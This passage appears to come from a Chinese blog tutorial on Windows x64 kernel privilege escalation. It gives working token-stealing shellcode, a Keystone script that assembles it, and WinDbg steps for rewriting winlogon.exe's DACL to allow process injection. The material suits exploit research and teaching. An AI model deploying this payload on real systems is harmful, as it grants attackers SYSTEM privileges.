<code>0xb8</code>偏移的数据，其实这两个位置指向的是同一个数据。<code>_KTHREAD</code> 0x98偏移位置是<code>ApcStateFill</code>，其实存储的结构是<code>_KAPC_STATE</code>，<code>0x20</code>位置存储的就是<code>_KPROCESS</code>。</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>: kd&gt; dt _KTHREAD   </span><br><span class="line">ntdll!_KTHREAD</span><br><span class="line">   +<span class="number">0x000</span> Header           : _DISPATCHER_HEADER</span><br><span class="line">   ......</span><br><span class="line">+<span class="number">0x098</span> ApcStateFill     : [<span class="number">43</span>] UChar</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>: kd&gt; dt _KAPC_STATE  </span><br><span class="line">ntdll!_KAPC_STATE</span><br><span class="line">   +<span class="number">0x000</span> ApcListHead      : [<span class="number">2</span>] _LIST_ENTRY</span><br><span class="line">   +<span class="number">0x020</span> <span class="built_in">Process</span>          : Ptr64 _KPROCESS </span><br><span class="line">   +<span class="number">0x028</span> InProgressFlags  : UChar</span><br><span class="line">   +<span class="number">0x028</span> KernelApcInProgress : Pos <span class="number">0</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x028</span> SpecialApcInProgress : Pos <span class="number">1</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x029</span> KernelApcPending : UChar</span><br><span class="line">   +<span class="number">0x02a</span> UserApcPendingAll : UChar</span><br><span class="line">   +<span class="number">0x02a</span> SpecialUserApcPending : Pos <span class="number">0</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x02a</span> UserApcPending   : Pos <span class="number">1</span>, <span class="number">1</span> Bit</span><br></pre></td></tr></table></figure><p>所以如下两段汇编代码都可以获取到当前进程的的<code>_KPROCESS</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov r9, qword ptr gs:[0x188]</span><br><span class="line">mov r9, qword ptr[r9+0x220]</span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov r9, qword ptr gs:[0x188]</span><br><span class="line">mov r9, qword ptr[r9+0x0B8]</span><br></pre></td></tr></table></figure><p>我们想修改的是cmd.exe的权限，但是这样获得的仅仅是cmd.exe启动的提权的进程的<code>_KPROCESS</code>，接下里需要去找其父进程cmd.exe的<code>_KPROCESS</code>位置。接下里看一下<code>_EPROCESS</code>的结构：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>: kd&gt; dt _EPROCESS  </span><br><span class="line">ntdll!_EPROCESS</span><br><span class="line">   +<span class="number">0x000</span> Pcb              : _KPROCESS</span><br><span class="line">   +<span class="number">0x2e0</span> ProcessLock      : _EX_PUSH_LOCK</span><br><span class="line">   +<span class="number">0x2e8</span> UniqueProcessId  : Ptr64 Void</span><br><span class="line">   +<span class="number">0x308</span> RefTraceEnabled  : Pos <span class="number">9</span>, <span class="number">1</span> Bit</span><br><span class="line">   ....</span><br><span class="line">   +<span class="number">0x3e8</span> InheritedFromUniqueProcessId : Ptr64 Void</span><br></pre></td></tr></table></figure><p><code>UniqueProcessId</code> 存储的是当前进程的pid，<code>InheritedFromUniqueProcessId</code>存储的是父进程的pid。</p><p>在这里其实有一个疑问，我们获取的其实是<code>_KPROCESS</code>的地址，但需要的是<code>_EPROCESS</code>的地址，这怎么处理呢？</p><p>其实<code>_KPROCESS</code> 和<code>_EPROCESS</code> 指向的是同一个结构，这个从<code>_EPROCESS</code>的定义中就可以看出来，<code>_EPROCESS</code>是包含了<code>_KPROCESS</code>的结构体，他们的起始地址是一样的。</p><p>现在我们可以获取到cmd.exe的进程id，接下里需要获取到cmd.exe进程的 <code>_EPROCESS</code>,这里需要另外一个知识，windows系统中的所有进程<code>_KPROCESS</code>是使用一个双向链表进行管理的，链表元素就是<code>ActiveProcessLinks</code>，接下来遍历这个链表就可以找到cmd.exe的<code>_KPROCESS</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">ntdll!_EPROCESS</span><br><span class="line">   +0x000 Pcb              : _KPROCESS</span><br><span class="line">   +0x2e0 ProcessLock      : _EX_PUSH_LOCK</span><br><span class="line">   +0x2e8 UniqueProcessId  : Ptr64 Void</span><br><span class="line">   +0x2f0 ActiveProcessLinks : _LIST_ENTRY</span><br><span class="line"></span><br><span class="line">1: kd&gt; dt _LIST_ENTRY</span><br><span class="line">ntdll!_LIST_ENTRY</span><br><span class="line">   +0x000 Flink            : Ptr64 _LIST_ENTRY</span><br><span class="line">   +0x008 Blink            : Ptr64 _LIST_ENTRY</span><br></pre></td></tr></table></figure><p>代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mov r9, qword ptr gs:[0x188]  ; stores KTHREAD value</span><br><span class="line">mov r9, qword ptr[r9+0x220]  ; stores EPROCESS as an offset to KTHREAD</span><br><span class="line">mov r8, [r9+0x3e8]                ;stores InheritedFromUniqueProcessId (cmd.exe PID)</span><br><span class="line">mov rax, r9                       ;moves current EPROCESS into eax</span><br><span class="line">loop1:</span><br><span class="line">  mov rax,qword ptr [rax + 0x2f0]          ;saves the next linked list pointer into rax</span><br><span class="line">  sub rax, 0x2f0                  ;gets the KPROCESS</span><br><span class="line">  cmp [rax + 0x2e8],r8            ;compare the ProcessId with cmd&#39;s.</span><br><span class="line">  jne loop1                       ;if not equal, repeat</span><br></pre></td></tr></table></figure><p>cmd.exe 的 <code>_KPROCESS</code> 地址就存储在<code>rax</code> 中。</p><p>接下来再遍历一遍<code>_KPROCESS</code>，读取<code>system</code>进程的token，替换掉cmd.exe进程的。<code>system</code>进程在系统中的pid恒定为4，根据这个来找：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">mov rdx,rax</span><br><span class="line">add rdx,0x360  ; 存储cmd.exe的token的地址</span><br><span class="line">mov rax,r9</span><br><span class="line">loop2:  ; 找system进程的 KTHREAD</span><br><span class="line">mov rax,qword ptr [rax + 0x2f0]          ;saves the next linked list pointer into rax</span><br><span class="line">sub rax, 0x2f0                  ;gets the KPROCESS</span><br><span class="line">cmp  byte ptr [rax + 0x2e8],4            ;compare the ProcessId with cmd&#39;s.</span><br><span class="line">    jne loop2</span><br><span class="line">mov rcx,rax </span><br><span class="line">add rcx,0x360 ; 获取system的token地址</span><br><span class="line">mov rbx, [rcx] ; 读取token的内容</span><br><span class="line">mov [rdx],rbx ; 写进cmd.exe</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><p>接下来使用<code>Keystone</code>进行编译，测试:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8 </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> keystone <span class="keyword">as</span> k</span><br><span class="line"></span><br><span class="line">CODE = <span class="string">"""</span></span><br><span class="line"><span class="string">mov r9, qword ptr[r9+0x220]  </span></span><br><span class="line"><span class="string">mov r8, [r9+0x3e8]               </span></span><br><span class="line"><span class="string">mov rax, r9                     </span></span><br><span class="line"><span class="string">loop1:</span></span><br><span class="line"><span class="string">  mov rax,qword ptr [rax + 0x2f0]         </span></span><br><span class="line"><span class="string">  sub rax, 0x2f0                 </span></span><br><span class="line"><span class="string">  cmp [rax + 0x2e8],r8           </span></span><br><span class="line"><span class="string">  jne loop1                      </span></span><br><span class="line"><span class="string">mov rdx,rax</span></span><br><span class="line"><span class="string">add rdx,0x360 </span></span><br><span class="line"><span class="string">mov rax,r9</span></span><br><span class="line"><span class="string">loop2:  </span></span><br><span class="line"><span class="string">mov rax,qword ptr [rax + 0x2f0]       </span></span><br><span class="line"><span class="string">sub rax, 0x2f0                </span></span><br><span class="line"><span class="string">cmp  byte ptr [rax + 0x2e8],4  </span></span><br><span class="line"><span class="string">    jne loop2</span></span><br><span class="line"><span class="string">mov rcx,rax </span></span><br><span class="line"><span class="string">add rcx,0x360 </span></span><br><span class="line"><span class="string">mov rbx, [rcx]  </span></span><br><span class="line"><span class="string">mov [rdx],rbx </span></span><br><span class="line"><span class="string">ret</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">mov r9,qword ptr gs:[0x188] capstone支持的不好，汇编出来的是不对的</span></span><br><span class="line"><span class="string">不要问我为什么，我也想知道为什么 .....</span></span><br><span class="line"><span class="string">有时间了去看看keystone的源代码了，看能不能修</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># CODE = """mov r9,qword ptr gs:[0x188]"""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"></span><br><span class="line">    ks = k.Ks(k.KS_ARCH_X86, k.KS_MODE_64)</span><br><span class="line">    encoding, count = ks.asm(CODE)</span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">       补充 mov r9,qword ptr gs:[0x188] 的的操作码</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    read_gs = [ <span class="number">0x65</span> ,<span class="number">0x4C</span>, <span class="number">0x8B</span> ,<span class="number">0x0C</span>,<span class="number">0x25</span>, <span class="number">0x88</span> ,<span class="number">0x01</span> ,<span class="number">0x00</span> ,<span class="number">0x00</span> ]</span><br><span class="line">    encoding = read_gs + encoding</span><br><span class="line">    print(encoding)</span><br><span class="line">    <span class="comment"># print("%s = %s (number of statements: %u)" %(CODE, encoding, count))</span></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">"shellcode.bin"</span>,<span class="string">"wb"</span>) <span class="keyword">as</span> fd:</span><br><span class="line">        fd.write( bytes( encoding ) )</span><br><span class="line"><span class="keyword">except</span> k.KsError  <span class="keyword">as</span> e:</span><br><span class="line">    print(<span class="string">"ERROR: %s"</span> %e)</span><br></pre></td></tr></table></figure><p>记得关闭系统的UAC和windows defender，最后测试结果如下，提权成功 ：</p><p><img src="https://pic.wonderkun.cc//uploads/note/20210822195418.png" alt=""></p><p>windows defender的内存扫描可以把这个shellcode判黑，还是挺厉害的。</p><h2 id="方法二：编辑ACL-ACE"><a href="#方法二：编辑ACL-ACE" class="headerlink" title="方法二：编辑ACL/ACE"></a>方法二：编辑ACL/ACE</h2><p>此方法在2012年就提出了，主要思想是编辑一个高权限的系统进程的<code>SecurityDescriptor</code>，将它修改为NULL，这样会导致一个低权限的用户能够修改和编辑高权限的进程，然后进行进程注入，弹出具有system权限的shell。但是直接将 <code>SecurityDescriptor</code> 置0的操作已经被windows patch了。虽然直接修改为NULL会造成蓝屏，但是这并不意味着我们不能修改<code>SecurityDescriptor</code>, 我们可以修改的ACL列表，让任意用户可以访问此进程。不过这意味着之前一个内核中的一个任意地址置零就可以利用的漏洞，现在必须通过任意地址写才可以利用了。</p><p>我们先将<code>SecurityDescriptor</code> 修改为0，看一下会发生什么：</p><p>首先windows的内核对象前都有一个 <code>_object_header</code>的结构，它的大小是0x30:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">1: kd&gt; dt _object_header</span><br><span class="line">nt!_OBJECT_HEADER</span><br><span class="line">   +0x000 PointerCount     : Int8B</span><br><span class="line">   +0x008 HandleCount      : Int8B</span><br><span class="line">   +0x008 NextToFree       : Ptr64 Void</span><br><span class="line">   +0x010 Lock             : _EX_PUSH_LOCK</span><br><span class="line">   +0x018 TypeIndex        : UChar</span><br><span class="line">   +0x019 TraceFlags       : UChar</span><br><span class="line">   +0x019 DbgRefTrace      : Pos 0, 1 Bit</span><br><span class="line">   +0x019 DbgTracePermanent : Pos 1, 1 Bit</span><br><span class="line">   +0x01a InfoMask         : UChar</span><br><span class="line">   +0x01b Flags            : UChar</span><br><span class="line">   +0x01b NewObject        : Pos 0, 1 Bit</span><br><span class="line">   +0x01b KernelObject     : Pos 1, 1 Bit</span><br><span class="line">   +0x01b KernelOnlyAccess : Pos 2, 1 Bit</span><br><span class="line">   +0x01b ExclusiveObject  : Pos 3, 1 Bit</span><br><span class="line">   +0x01b PermanentObject  : Pos 4, 1 Bit</span><br><span class="line">   +0x01b DefaultSecurityQuota : Pos 5, 1 Bit</span><br><span class="line">   +0x01b SingleHandleEntry : Pos 6, 1 Bit</span><br><span class="line">   +0x01b DeletedInline    : Pos 7, 1 Bit</span><br><span class="line">   +0x01c Reserved         : Uint4B</span><br><span class="line">   +0x020 ObjectCreateInfo : Ptr64 _OBJECT_CREATE_INFORMATION</span><br><span class="line">   +0x020 QuotaBlockCharged : Ptr64 Void</span><br><span class="line">   +0x028 SecurityDescriptor : Ptr64 Void</span><br><span class="line">   +0x030 Body             : _QUAD</span><br></pre></td></tr></table></figure><p>所以 <code>_EPROCESS</code>向前0x30的位置，就是进程对象的<code>_object_header</code>:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">1: kd&gt; !process 0 0 winlogon.exe </span><br><span class="line">PROCESS ffffb78f2b0d3140</span><br><span class="line">    SessionId: 1  Cid: 0260    Peb: 6336452000  ParentCid: 01f8</span><br><span class="line">    DirBase: 12b8fd002  ObjectTable: ffff900849cfc180  HandleCount: 257.</span><br><span class="line">    Image: winlogon.exe</span><br><span class="line">    </span><br><span class="line">1: kd&gt; dt _object_header ffffb78f2b0d3140-30 </span><br><span class="line">nt!_OBJECT_HEADER</span><br><span class="line">   +0x000 PointerCount     : 0n458557</span><br><span class="line">   ....</span><br><span class="line">   +0x028 SecurityDescriptor : 0xffff9008&#96;464082a1 Void</span><br><span class="line">   +0x030 Body             : _QUAD</span><br></pre></td></tr></table></figure><p>将<code>SecurityDescriptor</code> 修改为NULL，就会直接蓝屏了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">1: kd&gt; eq  ffffb78f2b0d3140-30+28 0  </span><br><span class="line">1: kd&gt; g</span><br><span class="line">KDTARGET: Refreshing KD connection</span><br><span class="line"></span><br><span class="line">*** Fatal System Error: 0x00000189</span><br><span class="line">                       (0xFFFFB78F2B0D3110,0xFFFFB78F272AF380,0x0000000000000001,0x0000000000000000)</span><br><span class="line"></span><br><span class="line">Break instruction exception - code 80000003 (first chance)</span><br><span class="line"></span><br><span class="line">A fatal system error has occurred.</span><br><span class="line">Debugger entered on first try; Bugcheck callbacks have not been invoked.</span><br><span class="line"></span><br><span class="line">A fatal system error has occurred.</span><br><span class="line"></span><br><span class="line">For analysis of this file, run !analyze -v</span><br><span class="line">nt!DbgBreakPointWithStatus:</span><br><span class="line">fffff800&#96;3afc4580 cc              int     3</span><br></pre></td></tr></table></figure><p>这就直接蓝屏了。</p><h3 id="使用windbg进行调试"><a href="#使用windbg进行调试" class="headerlink" title="使用windbg进行调试"></a>使用windbg进行调试</h3><p>我们接下里开始正确的思路，进行的步骤是：</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span> 定位到winlogon.exe进程的SecurityDescriptor</span><br><span class="line"><span class="number">2.</span> 从SecurityDescriptor中找到包含ACCESS_ALLOWED_ACE的DACL列表</span><br><span class="line"><span class="number">3.</span> 修改其中的sid为 S<span class="number">-1</span><span class="number">-5</span><span class="number">-11</span>, 所有经过身份认证的用户都是这个sid，这样就是当前的所有用户都有权限访问和修改此进程</span><br><span class="line"><span class="number">4.</span> 修改漏洞利用进程的MandatoryPolicy为<span class="number">0</span>，进行进程注入，获取system权限。</span><br></pre></td></tr></table></figure><p>为了修改ACL，我们先看一下相关的数据结构：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0: kd&gt; dt _SECURITY_DESCRIPTOR </span><br><span class="line">nt!_SECURITY_DESCRIPTOR</span><br><span class="line">   +0x000 Revision         : UChar</span><br><span class="line">   +0x001 Sbz1             : UChar</span><br><span class="line">   +0x002 Control          : Uint2B</span><br><span class="line">   +0x008 Owner            : Ptr64 Void</span><br><span class="line">   +0x010 Group            : Ptr64 Void</span><br><span class="line">   +0x018 Sacl             : Ptr64 _ACL</span><br><span class="line">   +0x020 Dacl             : Ptr64 _ACL</span><br></pre></td></tr></table></figure><p>这里可以看到<code>Dacl</code>,它保存了对此对象有操作权限的用户，ACL的结构如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">0: kd&gt; dt _ACL </span><br><span class="line">nt!_ACL</span><br><span class="line">   +0x000 AclRevision      : UChar</span><br><span class="line">   +0x001 Sbz1             : UChar</span><br><span class="line">   +0x002 AclSize          : Uint2B</span><br><span class="line">   +0x004 AceCount         : Uint2B</span><br><span class="line">   +0x006 Sbz2             : Uint2B</span><br></pre></td></tr></table></figure><p>可以说明这个<code>_ACL</code>其实只存储了数据头部，后买你才是真实存储的ACL数据。在DACL中有两种ACE，分别是<code>ACCESS_ALLOWED_ACE</code>和<code>ACCESS_DENIED_ACE</code>,我们接下来就开始修改<code>ACCESS_ALLOWED_ACE</code>,实现让任意用户都有访权限。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">ACCESS_ALLOWED_ACE</span> &#123;</span></span><br><span class="line">  ACE_HEADER  Header;</span><br><span class="line">  ACCESS_MASK Mask;</span><br><span class="line">  DWORD       SidStart;</span><br><span class="line">&#125; ACCESS_ALLOWED_ACE;</span><br></pre></td></tr></table></figure><p>接下来就来看一下这个具体的<code>SecurityDescriptor</code> 是长什么样：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">0: kd&gt; !process 0 0 winlogon.exe</span><br><span class="line">PROCESS ffffb78f2b0d3140</span><br><span class="line">    SessionId: 1  Cid: 0260    Peb: 6336452000  ParentCid: 01f8</span><br><span class="line">    DirBase: 12b8fd002  ObjectTable: ffff900849cfc180  HandleCount: 259.</span><br><span class="line">    Image: winlogon.exe</span><br><span class="line"></span><br><span class="line">0: kd&gt; dt _OBJECT_HEADER ffffb78f2b0d3140-30  SecurityDescriptor</span><br><span class="line">nt!_OBJECT_HEADER</span><br><span class="line">   +0x028 SecurityDescriptor : 0xffff9008&#96;464082a2 Void</span><br><span class="line">0: kd&gt; !sd 0xffff9008&#96;464082a2</span><br><span class="line">30000000140000: Unable to get MIN SID header</span><br><span class="line">30000000140000: Unable to read in Owner in SD</span><br><span class="line">0: kd&gt; !sd 0xffff9008&#96;464082a0 </span><br><span class="line">-&gt;Revision: 0x1</span><br><span class="line">-&gt;Sbz1    : 0x0</span><br><span class="line">-&gt;Control : 0x8814</span><br><span class="line">            SE_DACL_PRESENT</span><br><span class="line">            SE_SACL_PRESENT</span><br><span class="line">            SE_SACL_AUTO_INHERITED</span><br><span class="line">            SE_SELF_RELATIVE</span><br><span class="line">-&gt;Owner   : S-1-5-32-544</span><br><span class="line">-&gt;Group   : S-1-5-18</span><br><span class="line">-&gt;Dacl    : </span><br><span class="line">-&gt;Dacl    : -&gt;AclRevision: 0x2</span><br><span class="line">-&gt;Dacl    : -&gt;Sbz1       : 0x0</span><br><span class="line">-&gt;Dacl    : -&gt;AclSize    : 0x3c</span><br><span class="line">-&gt;Dacl    : -&gt;AceCount   : 0x2</span><br><span class="line">-&gt;Dacl    : -&gt;Sbz2       : 0x0</span><br><span class="line">-&gt;Dacl    : -&gt;Ace[0]: -&gt;AceType: ACCESS_ALLOWED_ACE_TYPE</span><br><span class="line">-&gt;Dacl    : -&gt;Ace[0]: -&gt;AceFlags: 0x0</span><br><span class="line">-&gt;Dacl    : -&gt;Ace[0]: -&gt;AceSize: 0x14</span><br><span class="line">-&gt;Dacl    : -&gt;Ace[0]: -&gt;Mask : 0x001fffff</span><br><span class="line">-&gt;Dacl    : -&gt;Ace[0]: -&gt;SID: S-1-5-18</span><br><span class="line"></span><br><span class="line">-&gt;Dacl    : -&gt;Ace[1]: -&gt;AceType: ACCESS_ALLOWED_ACE_TYPE</span><br><span class="line">-&gt;Dacl    : -&gt;Ace[1]: -&gt;AceFlags: 0x0</span><br><span class="line">-&gt;Dacl    : -&gt;Ace[1]: -&gt;AceSize: 0x18</span><br><span class="line">-&gt;Dacl    : -&gt;Ace[1]: -&gt;Mask : 0x00121411</span><br><span class="line">-&gt;Dacl    : -&gt;Ace[1]: -&gt;SID: S-1-5-32-544</span><br><span class="line"></span><br><span class="line">-&gt;Sacl    : </span><br><span class="line">-&gt;Sacl    : -&gt;AclRevision: 0x2</span><br><span class="line">-&gt;Sacl    : -&gt;Sbz1       : 0x0</span><br><span class="line">-&gt;Sacl    : -&gt;AclSize    : 0x1c</span><br><span class="line">-&gt;Sacl    : -&gt;AceCount   : 0x1</span><br><span class="line">-&gt;Sacl    : -&gt;Sbz2       : 0x0</span><br><span class="line">-&gt;Sacl    : -&gt;Ace[0]: -&gt;AceType: SYSTEM_MANDATORY_LABEL_ACE_TYPE</span><br><span class="line">-&gt;Sacl    : -&gt;Ace[0]: -&gt;AceFlags: 0x0</span><br><span class="line">-&gt;Sacl    : -&gt;Ace[0]: -&gt;AceSize: 0x14</span><br><span class="line">-&gt;Sacl    : -&gt;Ace[0]: -&gt;Mask : 0x00000003</span><br><span class="line">-&gt;Sacl    : -&gt;Ace[0]: -&gt;SID: S-1-16-16384</span><br></pre></td></tr></table></figure><p>DACL有两项ACE，<code>S-1-5-18</code> 是 <code>LocalSystem</code> 用户，<code>S-1-5-32-544</code> 是administrator用户，但是这里需要注意的是 windbg给出的<code>_SECURITY_DESCRIPTOR</code>符号是错误，有大佬已经给我们指出了正确的偏移如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dt _SECURITY_DESCRIPTOR</span><br><span class="line">nt!_SECURITY_DESCRIPTOR</span><br><span class="line">   +0x000 Revision         : UChar</span><br><span class="line">   +0x001 Sbz1             : UChar</span><br><span class="line">   +0x002 Control          : Uint2B</span><br><span class="line">   +0x008 Owner            : Ptr64 Void</span><br><span class="line">   +0x010 Group            : Ptr64 Void</span><br><span class="line">   +0x018 Sacl             : Ptr64 _ACL</span><br><span class="line">   +0x020 Dacl             : Ptr64 _ACL   &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt; wrong symbol, it should be 0x30</span><br></pre></td></tr></table></figure><p>下面来查看一下DACL：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">0: kd&gt; dt _ACL 0xffff9008&#96;464082a0 + 0x30 </span><br><span class="line">nt!_ACL</span><br><span class="line">   +0x000 AclRevision      : 0x2 &#39;&#39;</span><br><span class="line">   +0x001 Sbz1             : 0 &#39;&#39;</span><br><span class="line">   +0x002 AclSize          : 0x3c</span><br><span class="line">   +0x004 AceCount         : 2</span><br><span class="line">   +0x006 Sbz2             : 0</span><br></pre></td></tr></table></figure><p>和我们刚才使用<code>!sd</code>命令打印出来的ACL头信息是一致的，但是这里只能看见头，观察一下这个数据：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">-&gt;Dacl    : -&gt;AclRevision: 0x2</span><br><span class="line">-&gt;Dacl    : -&gt;Sbz1       : 0x0</span><br><span class="line">-&gt;Dacl    : -&gt;AclSize    : 0x3c</span><br><span class="line">-&gt;Dacl    : -&gt;AceCount   : 0x2</span><br><span class="line">-&gt;Dacl    : -&gt;Sbz2       : 0x0</span><br><span 